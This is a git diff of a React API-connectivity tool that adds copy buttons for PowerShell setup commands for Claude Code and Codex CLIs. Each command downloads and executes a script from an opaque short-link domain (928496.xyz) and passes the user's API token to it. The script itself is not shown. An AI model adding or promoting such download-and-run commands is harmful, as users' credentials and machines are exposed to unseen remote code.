@@ -3,6 +3,7 @@ import { useEffect, useMemo, useState } from 'react';
 import {
   CheckCircle2,
   Clock3,
+  Copy,
   FileJson,
   History,
   KeyRound,
@@ -13,6 +14,7 @@ import {
   RefreshCw,
   Server,
   ShieldAlert,
+  Terminal,
   Trash2,
   X,
   XCircle,
@@ -495,6 +497,72 @@ export default function OpenAIConnectivityTool() {
                 Token 仅用于当前测试请求；历史记录保存在浏览器本地。
               </p>
             </div>
+
+            {url.trim() && token.trim() && (
+              <div className="mt-2 space-y-3">
+                <div className="rounded-2xl border border-[var(--accent-color)]/20 bg-[var(--accent-color)]/5 p-4 animate-in fade-in slide-in-from-top-2 duration-300">
+                  <div className="flex items-center justify-between mb-3">
+                    <div className="flex items-center gap-2 text-sm font-semibold text-[var(--accent-color)]">
+                      <Terminal className="w-4 h-4" />
+                      PowerShell 配置命令 (Claude Code CLI)
+                    </div>
+                    <button
+                      onClick={() => {
+                        const normalized = url.trim().replace(/\/v1\/?$/, '').replace(/\/+$/, '');
+                        const cmd = `& ([scriptblock]::Create((irm 'https://www.928496.xyz/s/68c6daaf'))) -BaseUrl "${normalized}" -AuthToken "${token.trim()}"`;
+                        navigator.clipboard.writeText(cmd).then(() => {
+                          window.showToast?.('命令已复制到剪贴板', 'success');
+                        });
+                      }}
+                      title="复制命令"
+                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-[var(--accent-color)]/10 hover:bg-[var(--accent-color)]/20 text-[var(--accent-color)] text-xs font-medium transition-all"
+                    >
+                      <Copy className="w-3.5 h-3.5" />
+                      复制
+                    </button>
+                  </div>
+                  <div className="relative group">
+                    <div className="text-[13px] font-mono break-all bg-[var(--bg-main)] p-3.5 rounded-xl border border-[var(--border-color)] text-[var(--text-primary)] leading-relaxed select-all">
+                      & ([scriptblock]::Create((irm 'https://www.928496.xyz/s/68c6daaf'))) -BaseUrl "{url.trim().replace(/\/v1\/?$/, '').replace(/\/+$/, '')}" -AuthToken "{token.trim()}"
+                    </div>
+                  </div>
+                  <p className="mt-2 text-[11px] text-[var(--text-secondary)] opacity-70">
+                    复制此命令在 PowerShell 中运行，可快速为当前本地环境配置 Claude API。
+                  </p>
+                </div>
+
+                <div className="rounded-2xl border border-[var(--accent-color)]/20 bg-[var(--accent-color)]/5 p-4 animate-in fade-in slide-in-from-top-2 duration-300">
+                  <div className="flex items-center justify-between mb-3">
+                    <div className="flex items-center gap-2 text-sm font-semibold text-[var(--accent-color)]">
+                      <Terminal className="w-4 h-4" />
+                      PowerShell 配置命令 (OpenAI Codex CLI)
+                    </div>
+                    <button
+                      onClick={() => {
+                        const normalized = url.trim().replace(/\/v1\/?$/, '').replace(/\/+$/, '');
+                        const cmd = `& ([scriptblock]::Create((irm 'https://www.928496.xyz/s/321b2e18'))) -BaseUrl "${normalized}" -AuthToken "${token.trim()}"`;
+                        navigator.clipboard.writeText(cmd).then(() => {
+                          window.showToast?.('命令已复制到剪贴板', 'success');
+                        });
+                      }}
+                      title="复制命令"
+                      className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-[var(--accent-color)]/10 hover:bg-[var(--accent-color)]/20 text-[var(--accent-color)] text-xs font-medium transition-all"
+                    >
+                      <Copy className="w-3.5 h-3.5" />
+                      复制
+                    </button>
+                  </div>
+                  <div className="relative group">
+                    <div className="text-[13px] font-mono break-all bg-[var(--bg-main)] p-3.5 rounded-xl border border-[var(--border-color)] text-[var(--text-primary)] leading-relaxed select-all">
+                      & ([scriptblock]::Create((irm 'https://www.928496.xyz/s/321b2e18'))) -BaseUrl "{url.trim().replace(/\/v1\/?$/, '').replace(/\/+$/, '')}" -AuthToken "{token.trim()}"
+                    </div>
+                  </div>
+                  <p className="mt-2 text-[11px] text-[var(--text-secondary)] opacity-70">
+                    复制此命令在 PowerShell 中运行，可自动配置 OpenAI Codex CLI 基础地址与密钥。
+                  </p>
+                </div>
+              </div>
+            )}
           </div>
         </section>
 
